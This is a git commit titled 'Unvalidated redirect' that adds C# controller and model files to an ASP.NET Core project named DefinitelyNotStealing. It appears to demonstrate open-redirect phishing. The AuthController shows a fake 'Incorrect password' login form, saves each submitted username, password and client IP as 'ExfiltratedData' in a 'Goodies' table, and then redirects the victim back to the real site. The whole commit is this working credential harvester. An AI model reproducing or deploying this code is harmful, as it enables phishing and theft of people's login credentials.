6b3e128c0482f938783f8311ff9ce35cc066f097
Emil Craciun <emil.craciun@live.com>
2019-10-30 19:30:49 +0200

    Unvalidated redirect

---
+++ src/DefinitelyNotStealing/Controllers/AuthController.cs
@@ -0,0 +1,46 @@
+﻿using DefinitelyNotStealing.Data;
+using DefinitelyNotStealing.Models;
+using DefinitelyNotStealing.Models.Entities;
+using Microsoft.AspNetCore.Http;
+using Microsoft.AspNetCore.Mvc;
+using Newtonsoft.Json;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
+
+namespace DefinitelyNotStealing.Controllers
+{
+    public class AuthController : Controller
+    {
+        private readonly AppDataContext _ctx;
+        private readonly IHttpContextAccessor _httpContextAccessor;
+
+        public AuthController(AppDataContext context, IHttpContextAccessor httpContextAccessor)
+        {
+            _ctx = context;
+            _httpContextAccessor = httpContextAccessor;
+        }
+
+        [HttpGet]
+        public IActionResult Login()
+        {
+            ModelState.AddModelError("", "Incorrect password.");
+            return View(new LoginViewModel());
+        }
+
+        [HttpPost]
+        public async Task<IActionResult> Login(LoginViewModel loginViewModel)
+        {
+            await _ctx.Goodies.AddAsync(new ExfiltratedData
+            {
+                ClientIP = _httpContextAccessor.HttpContext.Connection.RemoteIpAddress.ToString(),
+                CorrelationId = Guid.NewGuid(),
+                Data = JsonConvert.SerializeObject(loginViewModel),
+                DataType = "Login credentials - from redirect",
+                Timestamp = DateTime.UtcNow
+            });
+            return Redirect("https://localhost:44300/");
+        }
+    }
+}
---
+++ src/DefinitelyNotStealing/Models/LoginViewModel.cs
@@ -0,0 +1,11 @@
+﻿using System.ComponentModel.DataAnnotations;
+
+namespace DefinitelyNotStealing.Models
+{
+    public class LoginViewModel
+    {
+        public string Username { get; set; }
+        [DataType(DataType.Password)]
+        public string Password { get; set; }
+    }
+}
